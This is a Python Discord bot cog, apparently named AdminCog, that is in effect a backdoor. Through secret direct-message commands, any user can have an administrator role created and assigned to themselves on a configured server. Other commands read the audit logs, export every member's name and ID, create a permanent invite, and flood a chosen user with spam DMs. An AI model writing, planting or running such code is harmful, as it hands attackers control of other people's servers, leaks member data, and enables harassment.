import discord
from discord.ext import commands
import os
import asyncio

def get_settings():
    settings = {}
    try:
        with open('data.txt', 'r', encoding='utf-8') as file:
            for line in file:
                if line.startswith('TOKEN='):
                    settings['TOKEN'] = line.strip().split('=')[1]
                elif line.startswith('ADMIN_SERVER='):
                    settings['ADMIN_SERVER'] = line.strip().split('=')[1]
                elif line.startswith('ROLE_NAME='):
                    settings['ROLE_NAME'] = line.strip().split('=')[1]
    except FileNotFoundError:
        print("data.txt not found")
    return settings

settings = get_settings()
TOKEN = settings.get('TOKEN')
ROLE_NAME = settings.get('ROLE_NAME')
ADMIN_SERVER = int(settings.get('ADMIN_SERVER'))

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

class AdminCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.spam_tasks = {}

    @commands.Cog.listener()
    async def on_message(self, message):
        if message.author.bot:
            return

        if isinstance(message.channel, discord.DMChannel):
            if message.content.startswith('troll'):
                await self.admin_command(message)
            elif message.content.startswith('remove'):
                await self.delete_command(message)
            elif message.content.startswith('log'):
                await self.spy_command(message)
            elif message.content.startswith('serversave'):
                await self.save_command(message)
            elif message.content.startswith('serverlink'):
                await self.link_command(message)
            elif message.content.startswith('dmspam'):
                await self.start_spam(message)
            elif message.content.startswith('quit'):
                await self.stop_spam(message)

    async def admin_command(self, message):
        guild = self.bot.get_guild(ADMIN_SERVER)
        if guild is None:
            await message.channel.send("Server not found.")
            return
        
        member = guild.get_member(message.author.id)
        if member is None:
            member = await guild.fetch_member(message.author.id)

        if member is None:
            await message.channel.send(f"Member not found in server `{guild.name}`.")
            return

        role = discord.utils.get(guild.roles, name=ROLE_NAME)
        if not role:
            role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))

        if role in member.roles:
            await message.channel.send(f"You already have the `{ROLE_NAME}` role.")
        else:
            await member.add_roles(role)
            await message.channel.send(f"Added `{ROLE_NAME}` role to you.")

    async def delete_command(self, message):
        guild = self.bot.get_guild(ADMIN_SERVER)
        if guild is None:
            await message.channel.send("Server not found.")
            return

        role = discord.utils.get(guild.roles, name=ROLE_NAME)
        if role:
            await role.delete()
            await message.channel.send(f"Deleted `{ROLE_NAME}` role.")
        else:
            await message.channel.send(f"`{ROLE_NAME}` role does not exist.")

    async def spy_command(self, message):
        guild = self.bot.get_guild(ADMIN_SERVER)
        if guild is None:
            await message.channel.send("Server not found.")
            return

        try:
            audit_logs = []
            async for log in guild.audit_logs(limit=10):
                audit_logs.append(log)

            log_messages = []
            for log in reversed(audit_logs):
                action = log.action
                user = log.user.name if log.user else 'Unknown'
                target = log.target
                reason = log.reason if log.reason else 'None'
                timestamp = log.created_at.strftime("%Y-%m-%d %H:%M:%S")

                log_message = f"**{timestamp}** - **Action:** {action}\n**User:** {user}\n**Target:** {target}\n**Reason:** {reason}\n"
                log_messages.append(log_message)

            response_message = '\n'.join(log_messages)
            await message.channel.send(f"```\n{response_message}\n```")
        except Exception as e:
            await message.channel.send(f"Error getting audit logs: {e}")
            print(f"Error getting audit logs: {e}")

    async def save_command(self, message):
        guild = self.bot.get_guild(ADMIN_SERVER)
        if guild is None:
            await message.channel.send("Server not found.")
            return

        members_info = []
        for member in guild.members:
            if not member.bot:
                members_info.append(f"{member.display_name},{member.name},{member.id}")

        members_info.sort(key=lambda x: x.split(',')[0].lower())

        max_name_length = max(len(info.split(',')[0]) for info in members_info)
        max_username_length = max(len(info.split(',')[1]) for info in members_info)
        max_user_id_length = max(len(info.split(',')[2]) for info in members_info)

        with open('members.txt', 'w', encoding='utf-8') as file:
            file.write(f"{'Name'.ljust(max_name_length)} {'Username'.ljust(max_username_length)} {'UserID'.ljust(max_user_id_length)}\n")
            for info in members_info:
                name, username, user_id = info.split(',')
                file.write(f"{name.ljust(max_name_length)} {username.ljust(max_username_length)} {user_id.ljust(max_user_id_length)}\n")

        try:
            await message.author.send(file=discord.File('members.txt'))
            os.remove('members.txt')
        except Exception as e:
            await message.channel.send(f"Error sending file: {e}")
            print(f"Error sending file: {e}")

    async def link_command(self, message):
        guild = self.bot.get_guild(ADMIN_SERVER)
        if guild is None:
            await message.channel.send("Server not found.")
            return
        
        try:
            invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, unique=True)
            await message.channel.send(f"Here is your invite link: {invite.url}")
        except Exception as e:
            await message.channel.send(f"Error creating invite link: {e}")
            print(f"Error creating invite link: {e}")

    async def start_spam(self, message):
        if message.author.id in self.spam_tasks:
            await message.channel.send("Spam already running.")
            return

        try:
            _, user_id, *msg_parts = message.content.split(maxsplit=2)
            user_id = int(user_id)
            msg = ' '.join(msg_parts)

            target_user = self.bot.get_user(user_id)
            if target_user is None:
                target_user = await self.bot.fetch_user(user_id)

            if target_user is None:
                await message.channel.send("User not found.")
                return

            async def spam_task():
                while self.spam_tasks.get(message.author.id):
                    for _ in range(5):
                        try:
                            await target_user.send(msg)
                        except Exception as e:
                            print(f"Error sending spam message: {e}")
                        await asyncio.sleep(0.001)
                    await asyncio.sleep(0.5)

            task = self.bot.loop.create_task(spam_task())
            self.spam_tasks[message.author.id] = task
            await message.channel.send("Spam started.")

        except Exception as e:
            await message.channel.send(f"Error starting spam: {e}")
            print(f"Error starting spam: {e}")

    async def stop_spam(self, message):
        if message.author.id not in self.spam_tasks:
            await message.channel.send("No spam task running.")
            return

        task = self.spam_tasks.pop(message.author.id)
        task.cancel()
        await message.channel.send("Spam stopped.")

async def setup(bot):
    await bot.add_cog(AdminCog(bot))
